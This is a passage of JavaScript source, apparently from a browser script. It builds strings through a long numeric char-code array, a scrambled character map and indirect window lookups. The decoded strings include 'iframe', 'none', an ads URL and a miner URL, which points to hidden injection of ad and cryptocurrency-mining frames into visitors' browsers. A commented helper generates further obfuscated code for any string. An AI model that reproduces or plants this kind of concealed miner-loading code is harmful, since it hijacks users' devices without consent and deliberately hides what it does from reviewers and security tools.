		88, 70, 90, 90, 118, 78, 86, 102, 38, 46, 105, 75, 47, 74, 104, 121, 108, 86, 108, 121, 83, 58,
		101, 117, 101, 76, 79, 76, 46, 107, 72, 107, 83, 84, 84, 110, 71, 77, 110, 114, 88, 70, 84, 98,
		108, 67, 117, 90, 80, 102, 38, 89, 121, 101, 115, 90, 100, 97, 75, 76, 75, 67, 75, 87, 70, 72,
		58, 71, 84, 81, 83, 88, 70, 72, 116, 121, 114, 67, 77, 75, 88, 78, 110, 108, 46, 119, 47, 90,
		111, 79, 87, 106, 85, 105, 102, 90, 68, 120, 99, 90, 108, 81, 80, 102, 98, 78, 101, 84, 107, 69,
		116, 112, 72, 110, 58, 114, 107, 75, 68, 72, 83, 111, 46, 81, 97, 87, 111, 114, 78, 98, 38, 80,
		86, 67, 66, 86, 77, 65, 63, 75, 116, 106, 112, 81, 65, 86, 88, 80, 97, 77, 80, 84, 99, 80, 79,
		68, 116, 107, 122, 82, 72, 102, 67, 99, 97, 66, 61, 81, 114, 120, 72, 101, 47, 76, 121, 87, 122,
		111, 80, 98, 63, 66, 120, 38, 115, 72, 110, 47, 78, 107, 38, 70, 83, 58, 116, 38, 70, 122, 86,
		88, 79, 89, 81, 77, 79, 66, 99, 107, 38, 102, 97, 86, 81, 38, 76, 82, 90, 98, 105, 78, 110, 70,
		78, 71, 88, 46, 47, 98, 78, 102, 102, 38, 70, 86, 114, 67, 75, 80, 82, 70, 81, 109, 72, 99, 67,
		117, 87, 73, 58, 90, 83, 67, 100, 117, 114, 100, 89, 114, 117, 106, 82, 107, 65, 71, 66, 88,
		121, 75, 66, 76, 118, 67, 122, 97, 107, 80, 65, 97, 84, 89, 105, 84, 117, 100, 78, 98, 101, 47,
		113, 82, 98, 79, 83, 63, 46, 101, 77, 116, 87, 47, 98, 83, 97, 66, 90, 58, 84, 97, 103, 120, 97,
		69, 75, 107, 58, 114, 72, 100, 110, 83, 121, 109, 102, 106, 73, 84, 77, 88, 70, 90, 90, 118, 78,
		86, 102, 38, 46, 105, 75, 47, 74, 104, 121, 108, 86, 108, 121, 83, 58, 101, 117, 101, 76, 79,
		76, 46, 107, 72, 107, 83, 84, 84, 110, 71, 77, 110, 114, 88, 70, 84, 98, 108, 67, 117, 90, 80,
		102, 38, 89, 121, 101, 115, 90, 100, 97, 75, 76, 75, 67, 75, 87, 70, 72, 58, 71, 84, 81, 83, 88,
		70, 72, 116, 121, 114, 67, 77, 75, 88, 78, 110, 108, 46, 119, 47, 90, 111, 79, 87, 106, 85, 105,
		102, 90, 68, 120, 99, 90, 108, 81, 80, 102, 98, 78, 101, 84, 107, 69, 116, 112, 72, 110, 58,
		114, 107, 75, 68, 72, 83, 111, 46, 81, 97, 87, 111, 114, 78, 98, 38, 80, 86, 67, 66, 86, 77, 65,
		63, 75, 116, 106, 112, 81, 65, 86, 88, 80, 97, 77, 80, 84, 99, 80, 79, 68, 116, 107, 122, 82,
		72, 102, 67, 99, 97, 66, 61, 81, 114, 120, 72, 101, 47, 76, 121, 87, 122, 111, 80, 98, 63, 66,
		120, 38, 115, 72, 110, 47, 78, 107, 38, 70, 83, 58, 116, 38, 70, 122, 86, 88, 79, 89, 81, 77,
		79, 66, 99, 107, 38, 102, 97, 86, 81, 38, 76, 82, 90, 98, 105, 78, 110, 70, 78, 71, 88, 46, 47,
		98, 78, 102, 102, 38, 70, 86, 114, 67, 75, 80, 82, 70, 81, 109, 72, 99, 67, 117, 87, 73, 58, 90,
		83, 67, 100, 117, 114, 100, 89, 114, 117, 106, 82, 107, 65, 71, 66, 88, 121, 75, 66, 76, 118,
		67, 122, 97, 107, 80, 65, 97, 84, 89, 105, 84, 117, 100, 78, 98, 101, 47, 113, 82, 98, 79, 83,
		63, 46, 101, 77, 116, 87, 47, 98, 83, 97, 66, 90, 58, 84, 97, 103, 120, 97, 69, 75, 107, 58,
		114, 72, 100, 110, 83, 121, 109, 102, 106, 73, 84, 77, 88, 70, 90, 90, 118, 78, 86, 102, 38, 46,
		105, 75, 47, 74, 104, 121, 108, 86, 108, 121, 83, 58, 101, 117, 101, 76, 79, 76, 46, 107, 72,
		107, 83, 84, 84, 110, 71, 77, 110, 114, 88, 70, 84, 98, 108, 67, 117, 90, 80, 102, 38, 89, 121,
		101, 115, 90, 100, 97, 75, 76, 75, 67, 75, 87, 70, 72, 58, 71, 84, 81, 83, 88, 70, 72, 116, 121,
		114, 67, 77, 75, 88, 78, 110, 108, 46, 119, 47, 90, 111, 79, 87, 106, 85, 105, 102, 90, 68, 120,
		99, 90, 108, 81, 80, 102, 98, 78, 101, 84, 107, 69, 116, 112, 72, 110, 58, 114, 107, 75, 68, 72,
		83, 111, 46, 81, 97, 87, 111, 114, 78, 98, 38, 80, 86, 67, 66, 86, 77, 65, 63, 75, 116, 106,
		112, 81, 65, 86, 88, 80, 97, 77, 80, 84, 99, 80, 79, 68, 116, 107, 122, 82, 72, 102, 67, 99, 97,
		66, 61, 81, 114, 120, 72, 101, 47, 76, 121, 87, 122, 111, 80, 98, 63, 66, 120, 38, 115, 72, 110,
		47, 78, 107, 38, 70, 83, 58, 116, 38, 70, 122, 86, 88, 79, 89, 81, 77, 79, 66, 99, 107, 38, 102,
		97, 86, 81, 38, 76, 82, 90, 98, 105, 78, 110, 70, 78, 71, 88, 46, 47, 98, 78, 102, 102, 38, 70,
		86, 114, 67, 75, 80, 82, 70, 81, 109, 72, 99, 67, 117, 87, 73, 58, 90, 83, 67, 100, 117, 114,
		100, 89, 114, 117, 106, 82, 107, 65, 71, 66, 88, 121, 75, 66, 76, 118, 67, 122, 97, 107, 80, 65,
		97, 84, 89, 105, 84, 117, 100, 78, 98, 101, 47, 113, 82, 98, 79, 83, 63, 46, 101, 77, 116, 87,
		47, 98, 83, 97, 66, 90, 58, 84, 97, 103, 120, 97, 69, 75, 107, 58, 114, 72, 100, 110, 83, 121,
		109, 102, 106, 73, 84, 77, 88, 70, 90, 90, 118, 78, 86, 102, 38, 46, 105, 75, 47, 74, 104, 121,
		108, 86, 108, 121, 83, 58, 101, 117, 101, 76, 79, 76, 46, 107, 72, 107, 83, 84, 84, 110, 71, 77,
		110, 114, 88, 70, 84, 98, 108, 67, 117, 90, 80, 102, 38, 89, 121, 101, 115, 90, 100, 97, 75, 76,
		75, 67, 75, 87, 70, 72, 58, 71, 84, 81, 83, 88, 70, 72, 116, 121, 114, 67, 77, 75, 88, 78, 110,
		108, 46, 119, 47, 90, 111, 79, 87, 106, 85, 105, 102, 90, 68, 120, 99, 90, 108, 81, 80, 102, 98,
		78, 101, 84, 107, 69, 116, 112, 72, 110, 58, 114, 107, 75, 68, 72, 83, 111, 46, 81, 97, 87, 111,
		114, 78, 98, 38, 80, 86, 67, 66, 86, 77, 65, 63, 75, 116, 106, 112, 81, 65, 86, 88, 80, 97, 77,
		80, 84, 99, 80, 79, 68, 116, 107, 122, 82, 72, 102, 67, 99, 97, 66, 61, 81, 114, 120, 72, 101,
		47, 76, 121, 87, 122, 111, 80, 98, 63, 66, 120, 38, 115, 72, 110, 47, 78, 107, 38, 70, 83, 58,
		116, 38, 70, 122, 86, 88, 79, 89, 81, 77, 79, 66, 99, 107, 38, 102, 97, 86, 81, 38, 76, 82, 90,
		98, 105, 78, 110, 70, 78, 71, 88, 46, 47, 98, 78, 102, 102, 38, 70, 86, 114, 67, 75, 80, 82, 70,
		81, 109, 72, 99, 67, 117, 87, 73, 58, 90, 83, 67, 100, 117, 114, 100, 89, 114, 117, 106, 82,
		107, 65, 71, 66, 88, 121, 75, 66, 76, 118, 67, 122, 97, 107, 80, 65, 97, 84, 89, 105, 84, 117,
		100, 78, 98, 101, 47, 113, 82, 98, 79, 83, 63, 46, 101, 77, 116, 87, 47, 98, 83, 97, 66, 90, 58,
		84, 97, 103, 120, 97, 69, 75, 107, 58, 114, 72, 100, 110, 83, 121, 109, 102, 106, 73, 84, 77,
		88, 70, 90, 90, 118, 78, 86, 102, 38, 46, 105, 75, 47, 74, 104, 121, 108, 86, 108, 121, 83, 58,
		101, 117, 101, 76, 79, 76, 46, 107, 72, 107, 83, 84, 84, 110, 71, 77, 110, 114, 88, 70, 84, 98,
		108, 67, 117, 90, 80, 102, 38, 89, 121, 101, 115, 90, 100, 97, 75, 76, 75, 67, 75, 87, 70, 72,
		58, 71, 84, 81, 83, 88, 70, 72, 116, 121, 114, 67, 77, 75, 88, 78, 110, 108, 46, 119, 47, 90,
		111, 79, 87, 106, 85, 105, 102, 90, 68, 120, 99, 90, 108, 81, 80, 102, 98, 78, 101, 84, 107, 69,
		116, 112, 72, 110, 58, 114, 107, 75, 68, 72, 83, 111, 46, 81, 97, 87, 111, 114, 78, 98, 38, 80,
		86, 67, 66, 86, 77, 65, 63, 75, 116, 106, 112, 81, 65, 86, 88, 80, 97, 77, 80, 84, 99, 80, 79,
		68, 116, 107, 122, 82, 72, 102, 67, 99, 97, 66, 61, 81, 114, 120, 72, 101, 47, 76, 121, 87, 122,
		111, 80, 98, 63, 66, 120, 38, 115, 72, 110, 47, 78, 107, 38, 70, 83, 58, 116, 38, 70, 122, 86,
		88, 79, 89, 81, 77, 79, 66, 99, 107, 38, 102, 97, 86, 81, 38, 76, 82, 90, 98, 105, 78, 110, 70,
		78, 71, 88, 46, 47, 98, 78, 102, 102, 38, 70, 86, 114, 67, 75, 80, 82, 70, 81, 109, 72, 99, 67,
		117, 87, 73, 58, 90, 83, 67, 100, 117, 114, 100, 89, 114, 117, 106, 82, 107, 65, 71, 66, 88,
		121, 75, 66, 76, 118, 67, 122, 97, 107, 80, 65, 97, 84, 89, 105, 84, 117, 100, 78, 98, 101, 47,
		113, 82, 98, 79, 83, 63, 46, 101, 77, 116, 87, 47, 98, 83, 97, 66, 90, 58, 84, 97, 103, 120, 97,
		69, 75, 107, 58, 114, 72, 100, 110, 83, 121, 109, 102, 106, 73, 84, 77, 88, 70, 90, 90, 118, 78,
		86, 102, 38, 46, 105, 75, 47, 74, 104, 121, 108, 86, 108, 121, 83, 58, 101, 117, 101, 76, 79,
		76, 46, 107, 72, 107, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 84, 84, 110, 71, 77, 110, 114, 88,
		70, 84, 98, 108, 67, 117, 90, 80, 102, 38, 89, 121, 101, 115, 90, 100, 97, 75, 76, 75, 67, 75,
		87, 70, 72, 58, 71, 84, 81, 83, 88, 70, 72, 116, 121, 114, 67, 77, 75, 88, 78, 110, 108, 46,
		119, 47, 90, 111, 79, 87, 106, 85, 105, 102, 90, 68, 120, 99, 90, 108, 81, 80, 102, 98, 78, 101,
		84, 107, 69, 116, 112, 72, 110, 58, 114, 107, 75, 68, 72, 83, 111, 46, 81, 97, 87, 111, 114, 78,
		98, 38, 80, 67, 66, 86, 77, 65, 63, 75, 116, 106, 112, 81, 65, 86, 88, 80, 97, 77, 80, 84, 99,
		80, 79, 68, 116, 107, 122, 82, 72, 102, 67, 99, 97, 66, 61, 81, 114, 120, 72, 101, 47, 76, 121,
		87, 122, 111, 80, 98, 63, 66, 120, 38, 115, 72, 110, 47, 78, 107, 38, 70, 83, 58
	];

	let map = '';
	const fromCharCode = getFromCharCodeMethod(MAP2);
	for (const code of codes) {
		map += window[STRING_STRING][fromCharCode](code);
	}

	return map;
}

function getMap2() {
	return 't&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHk0123456789TTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:';
}

function getStrings() {
	return [
		getFirefoxString(),
		getIframeString(),
		getSrcString(),
		getNoneString(),
		getAdsUrlString(),
		getMinerUrl(),
		getGetBrowserNameString()
	];
}

/**
 * 
	// Run this in browser console to get the obfuscated code to return a given string

	function generateObfuscatedCodeThatReturnsTheStringPassedAsParameter(theString) {
		const map = "t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHkSTTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PVCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:t&FzVXOYQMOBck&faVQ&LRZbiNnFNGX./bNff&FVrCKPRFQmHcCuWI:ZSCdurdYrujRkAGBXyKBLvCzakPAaTYiTudNbe/qRbOS?.eMtW/bSaBZ:TagxaEKk:rHdnSymfjITMXFZZvNVf&.iK/JhylVlyS:eueLOL.kHk0123456789TTnGMnrXFTblCuZPf&YyesZdaKLKCKWFH:GTQSXFHtyrCMKXNnl.w/ZoOWjUifZDxcZlQPfbNeTkEtpHn:rkKDHSo.QaWorNb&PCBVMA?KtjpQAVXPaMPTcPODtkzRHfCcaB=QrxHe/LyWzoPb?Bx&sHn/Nk&FS:";
		const numbersMap = {"0": 1800, 1: 1801, "2": 1802, "3": 1803, 4: 1804, 5: 1805, 6: 1806, 7: 1807, 8: 1808, 9: 1809}
		const indexes = [];
		for (const c of theString) {
			indexes.push(map.indexOf(c));
		}

		let generatedCode = "\t// returns \""+theString+"\"\n\tconst m = getCharCodeAtMethod(MAP);\n\treturn window[STRING_STRING][getFromCharCodeMethod(MAP)](\n\tgetMap()[m](window[PARSEINT_STRING](`"
		for (let i of indexes) {
			for (let c of i.toString()) {
				generatedCode += "${getMap()["+numbersMap[c]+"]}"
			}
			generatedCode += "`)),\n\t\tgetMap()[m](window[PARSEINT_STRING](`"
		}

		return generatedCode + "";
	}

 */
